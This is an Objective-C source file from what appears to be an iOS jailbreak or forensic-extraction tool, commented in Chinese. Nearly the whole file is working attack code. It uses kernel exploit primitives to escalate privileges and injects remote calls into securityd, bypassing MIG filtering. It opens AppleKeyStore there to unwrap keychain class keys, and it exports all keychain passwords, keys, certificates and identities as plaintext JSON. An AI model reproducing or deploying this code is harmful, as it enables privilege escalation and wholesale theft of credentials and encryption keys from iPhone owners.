//
//  OWRCEntry.m
//  见 OWRCEntry.h
//

#import "OWRCEntry.h"
#import "OWPrimitives.h"
#import "OWEscalate.h"

#import "RemoteCall.h"
#import "utils.h"
#import "offsets.h"

#import <Foundation/Foundation.h>
#import <Security/Security.h>
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <copyfile.h>
#import <stdarg.h>
#import <string.h>

// task_self_trap 在部分 iOS SDK 的头里没导出，这里自己声明。
// 注意不能在本进程调用它来"代替"远程进程：port name 是进程局部的，
// 必须在远程进程里取。dyld 共享缓存映射一致，所以函数地址可直接用。
extern mach_port_t task_self_trap(void);

// AKS 解包所用 selector。该值来自对本工程目标包（OPEN.app）的逆向结论：
// 远程进入 securityd 后向 AppleKeyStore user client 发 0xB 号调用取 class keys。
// 不同 iOS 版本可能不同，真机联调时以日志 "AKS selector" 为准核对。
#define OW_AKS_UNWRAP_SELECTOR 0xB

static RemoteCall     *gRC = nil;
static NSMutableData  *gKeysBuf  = nil;
static NSMutableData  *gItemsBuf = nil;
static char            gErr[512];

static void rc_fail(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    vsnprintf(gErr, sizeof(gErr), fmt, ap);
    va_end(ap);
}

const char *rc_last_error(void) { return gErr; }

#pragma mark - 就绪与 attach

int rc_ready(void) {
    return ow_primitives_available() ? 0 : -1;
}

int rc_attach(const char *processName) {
    if (!processName || !*processName) { rc_fail("进程名为空"); return -1; }

    if (ow_bind_primitives() != 0) {
        rc_fail("内核原语不可用（exploit 未成功或未编入 libjailbreak）");
        return -2;
    }

    // ow_prepare_offsets 自身带缓存，重复调用安全，不需要 dispatch_once
    int prep = ow_prepare_offsets();
    if (prep != 0) {
        rc_fail("偏移准备失败(%d): %s", prep, ow_escalate_last_error());
        return -4;
    }

    if (gRC) [gRC destroyRemoteCall];

    NSString *name = [NSString stringWithUTF8String:processName];
    RemoteCall *rc = [[RemoteCall alloc] initWithProcess:name useMigFilterBypass:YES];
    if (!rc) {
        NSString *e = [RemoteCall lastInitError];
        rc_fail("attach %s 失败: %s", processName, e ? e.UTF8String : "unknown");
        return -3;
    }

    gRC = rc;
    return 0;
}

int rc_detach(void) {
    if (!gRC) return 0;
    int r = [gRC destroyRemoteCall];
    gRC = nil;
    return r;
}

#pragma mark - 特权文件拷贝

int rc_copy_file(const char *src, const char *dst) {
    if (!src || !dst) { rc_fail("路径为空"); return -1; }

    int e = ow_escalate();
    if (e != 0) {
        rc_fail("提权失败(%d): %s", e, ow_escalate_last_error());
        return e;
    }

    [[NSFileManager defaultManager] removeItemAtPath:[NSString stringWithUTF8String:dst] error:nil];

    // copyfile 会带上元数据；失败时退化为普通读写，覆盖"只读得到内容"的场景
    if (copyfile(src, dst, NULL, COPYFILE_ALL) == 0) return 0;

    NSData *d = [NSData dataWithContentsOfFile:[NSString stringWithUTF8String:src]];
    if (!d) {
        rc_fail("拷贝失败且无法读取: %s (errno=%d)", src, errno);
        return -2;
    }
    if (![d writeToFile:[NSString stringWithUTF8String:dst] atomically:YES]) {
        rc_fail("写目标失败: %s", dst);
        return -3;
    }
    return 0;
}

#pragma mark - class keys（AKS 路径）

int rc_unwrap_class_keys(const void **outBytes, unsigned int *outLen) {
    if (!outBytes || !outLen) { rc_fail("出参为空"); return -1; }

    if (!gRC && rc_attach("securityd") != 0) return -2;

    uint64_t scratch = gRC.trojanMem;
    if (!scratch) { rc_fail("远程进程无可用 scratch 内存"); return -3; }

    // 1) 在 securityd 里打开 AppleKeyStore user client
    uint64_t nameStr  = remote_alloc_str(gRC, "AppleKeyStore");
    uint64_t matching = RemoteArbCall(gRC, IOServiceMatching, nameStr);
    if (!matching) { rc_fail("远程 IOServiceMatching 失败"); return -4; }

    uint64_t service = RemoteArbCall(gRC, IOServiceGetMatchingService,
                                     (uint64_t)kIOMasterPortDefault, matching);
    if (!service) { rc_fail("远程找不到 AppleKeyStore 服务"); return -5; }

    // 目标进程自己的 task port：不能在本地代劳，必须在远程取
    uint64_t selfTask = RemoteArbCall(gRC, task_self_trap);
    uint64_t connSlot = scratch + 0x40;
    uint64_t kr = RemoteArbCall(gRC, IOServiceOpen, service, selfTask, 0, connSlot);
    if (kr != 0) { rc_fail("远程 IOServiceOpen 失败 kr=0x%llx", kr); return -6; }

    uint64_t conn = [gRC remoteRead64From:connSlot];
    if (!conn || conn == UINT64_MAX) { rc_fail("拿到无效 connect handle"); return -7; }

    // 2) 发 AKS 解包调用
    uint64_t outScalar     = scratch + 0x100;
    uint64_t outScalarCnt  = scratch + 0x108;
    uint64_t outStruct     = scratch + 0x200;
    uint64_t outStructCnt  = scratch + 0x208;
    uint64_t structCap     = 0x800; // scratch 页内剩余空间足够

    [gRC remote_write64:outScalarCnt value:8];
    [gRC remote_write64:outStructCnt value:structCap];

    kr = RemoteArbCall(gRC, IOConnectCallMethod,
                       conn,
                       (uint64_t)OW_AKS_UNWRAP_SELECTOR,
                       0, 0,         // scalarInput / scalarInputCnt
                       0, 0,         // structInput / structInputCnt
                       outScalar, outScalarCnt,
                       outStruct, outStructCnt);
    if (kr != 0) {
        rc_fail("AKS selector 0x%x 调用失败 kr=0x%llx（该 selector 需按版本核对）",
                OW_AKS_UNWRAP_SELECTOR, kr);
        return -8;
    }

    uint64_t got = [gRC remoteRead64From:outStructCnt];
    if (!got || got > structCap) { rc_fail("AKS 返回长度异常: %llu", got); return -9; }

    NSMutableData *buf = [NSMutableData dataWithLength:(NSUInteger)got];
    if (![gRC remoteRead:outStruct to:buf.mutableBytes size:got]) {
        rc_fail("读取 AKS 输出失败");
        return -10;
    }

    gKeysBuf = buf;
    *outBytes = buf.bytes;
    *outLen   = (unsigned int)buf.length;
    return 0;
}

#pragma mark - keychain 明文导出（root + SecItem 兜底路径）

// 这条路径不依赖 AKS selector：root 且脱离沙箱后，securityd 会正常为
// SecItemCopyMatching 解密 v_Data（keychain-dumper 就是这么工作的）。
int rc_export_keychain_items(const void **outBytes, unsigned int *outLen) {
    if (!outBytes || !outLen) { rc_fail("出参为空"); return -1; }

    int e = ow_escalate();
    if (e != 0) {
        rc_fail("提权失败(%d): %s", e, ow_escalate_last_error());
        return e;
    }

    NSArray *classes = @[
        (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecClassInternetPassword,
        (__bridge id)kSecClassCertificate,
        (__bridge id)kSecClassKey,
        (__bridge id)kSecClassIdentity,
    ];

    NSMutableDictionary *result = [NSMutableDictionary new];
    for (id cls in classes) {
        NSDictionary *q = @{
            (__bridge id)kSecClass        : cls,
            (__bridge id)kSecMatchLimit   : (__bridge id)kSecMatchLimitAll,
            (__bridge id)kSecReturnData   : @YES,
            (__bridge id)kSecReturnAttributes : @YES,
        };
        CFTypeRef ref = NULL;
        OSStatus st = SecItemCopyMatching((__bridge CFDictionaryRef)q, &ref);
        if (st != errSecSuccess) {
            result[[NSString stringWithFormat:@"%@", cls]] =
                @{@"error": @(st)};
            continue;
        }
        id obj = CFBridgingRelease(ref);

        NSMutableArray *rows = [NSMutableArray new];
        NSArray *arr = [obj isKindOfClass:NSArray.class] ? obj : @[obj];
        for (NSDictionary *item in arr) {
            NSMutableDictionary *m = [NSMutableDictionary new];
            for (NSString *k in item) {
                id v = item[k];
                if ([v isKindOfClass:NSData.class]) {
                    m[k] = [v base64EncodedStringWithOptions:0];
                } else if ([v isKindOfClass:NSDate.class] ||
                           [v isKindOfClass:NSNumber.class] ||
                           [v isKindOfClass:NSString.class]) {
                    m[k] = v;
                } else {
                    m[k] = [NSString stringWithFormat:@"%@", v];
                }
            }
            [rows addObject:m];
        }
        result[[NSString stringWithFormat:@"%@", cls]] = rows;
    }

    NSData *jd = [NSJSONSerialization dataWithJSONObject:result options:0 error:nil];
    if (!jd) { rc_fail("keychain 明文序列化失败"); return -2; }

    gItemsBuf = [jd mutableCopy];
    *outBytes = gItemsBuf.bytes;
    *outLen   = (unsigned int)gItemsBuf.length;
    return 0;
}
